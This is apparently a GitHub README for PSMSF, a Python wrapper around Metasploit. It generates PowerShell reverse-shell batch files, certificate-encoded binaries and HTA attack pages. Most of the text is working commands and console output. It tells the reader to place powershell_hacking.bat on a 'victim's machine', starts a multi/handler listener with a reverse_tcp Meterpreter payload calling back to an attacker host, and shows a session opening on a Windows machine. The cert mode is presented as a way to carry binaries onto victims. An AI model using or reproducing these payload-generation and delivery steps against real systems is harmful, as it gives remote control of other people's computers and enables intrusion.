## PSMSF

[**PSMSF**](https://github.com/all3g/psmsf/) can help us generate payload or files used in cmd console/browser/.. with [**Metasploit-Framework**](https://github.com/rapid7/metasploit-framework/). If you are similar to windows cmd console, you can use the results in different areas.

```
psmsf [master●] python psmsf.py -h     
Usage: python psmsf.py [options]

Options:
  -h, --help            show this help message and exit
  --attacktype=ATTACKTYPE
                        Attack Types are supported. (ps, hta, crt)

  Powershell Attack:
    Powershell features

    --payload=PAYLOAD   payload of metasploit framework
    --lhost=LHOST       lhost for payload of metasploit framework
    --lport=LPORT       lport for payload of metasploit framework

  CERT Attack:
    Cert features

    --filename=FILENAME
                        file to be encoded to a certification

  HTA Attack:
    HTA features

    --command=COMMAND   command of attack mode
```

### **Requirement**

If you use [**Kali Linux**](https://www.kali.org), Install [**Metasploit-Framework**](https://www.metasploit.com/) with the command:

```
$ sudo apt-get install metasploit-framework
```


### **Usage**

[**psmsf**](https://github.com/all3g/psmsf) has three attack types,

- [x] powershell attack
- [x] cert attack
- [x] hta attack

#### Powershell Attack Mode

```
psmsf [master●] python psmsf.py --attacktype ps
[+]
     ######
      #     #  ####  #    #  ####  ######
       #     # #      ##  ## #      #
        ######   ####  # ## #  ####  #####
         #            # #    #      # #
          #       #    # #    # #    # #
           #        ####  #    #  ####  #

[+] Everything is now generated in two files, ex:
    powershell_hacking.bat - shellcode can be executed in cmd console.
                           - Usage: cmd.exe /c powershell_hacking.bat
    powershell_msf.rc      - msfconsole resource script.
                           - Usage: msfconsole -r powershell_msf.rc

[+] python psmsf.py --attacktype ps --payload windows/shell/reverse_tcp --lhost 192.168.1.100 --lport 8443
[+] python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.100 --lport 8443
[+] python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_http --lhost 192.168.1.100 --lport 8443
```

Everything is now generated in two files,

```
psmsf [master●] python psmsf.py --attacktype ps --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.101 --lport 8443
[+] create msfconsole resource script
[+] create powershell shellcode command
```

**Victim**

Please put the file **powershell_hacking.bat** to the victim's machine, and execute the shellcode with command.

```
cmd.exe /c powershell_hacking.bat
```

**Attacker**

Starts a **metasploit-framework** listeners,

```
psmsf [master●] msfconsole -r powershell_msf.rc

# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v4.11.11-dev-95484c8                 ]
+ -- --=[ 1521 exploits - 884 auxiliary - 259 post        ]
+ -- --=[ 437 payloads - 38 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing powershell_msf.rc for ERB directives.
resource (powershell_msf.rc)> use exploit/multi/handler
resource (powershell_msf.rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (powershell_msf.rc)> set LHOST 192.168.1.101
LHOST => 192.168.1.101
resource (powershell_msf.rc)> set LPORT 8443
LPORT => 8443
resource (powershell_msf.rc)> set ExitOnSession false
ExitOnSession => false
resource (powershell_msf.rc)> set EnableStageEncoding true
EnableStageEncoding => true
resource (powershell_msf.rc)> exploit -j
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.1.101:8443
[*] Starting the payload handler...
msf exploit(handler) >
```

If you run **powershell_hacking.bat** on victim's machine, a new session will be created:

```
msf exploit(handler) > jobs

Jobs
====

  Id  Name                    Payload                          LPORT
  --  ----                    -------                          -----
  0   Exploit: multi/handler  windows/meterpreter/reverse_tcp  8443

msf exploit(handler) >
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (958029 bytes) to 192.168.1.101
[*] Meterpreter session 1 opened (192.168.1.101:8443 -> 192.168.1.101:64656) at 2016-02-20 17:46:01 +0800

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : SEC
OS              : Windows 7 (Build 7600).
```

#### Cert Attack Mode

You can translate a binary file to a certificate file which is a text file.

```
psmsf [master●] python psmsf.py --attacktype crt --filename demo.exe
psmsf [master●] ll cert_attack
total 48
-rw-r--r--  1 Open-Security  staff    44B Feb 20 21:31 cert_decode.bat
-rw-r--r--  1 Open-Security  staff    17K Feb 20 21:31 cert_encode.crt
```

Upload **cert_encode.crt** to victim machine, and restore it with windows batch script - **cert_decode.bat**.


#### HTA Attack Mode

Create windows hta web page, and you can access **http://demo.com/index.html** with Internet Explorer Browser.

```
psmsf [master●] python psmsf.py --attacktype hta --command whoami               
[+] create hta index file
[+] create hta module file
psmsf [master●] ll windows_hta_attack
total 16
-rw-r--r--  1 Open-Security  staff   151B Feb 20 21:37 index.html
-rw-r--r--  1 Open-Security  staff   122B Feb 20 21:37 module.hta
```

## References

https://github.com/trustedsec/unicorn


License: BSD License
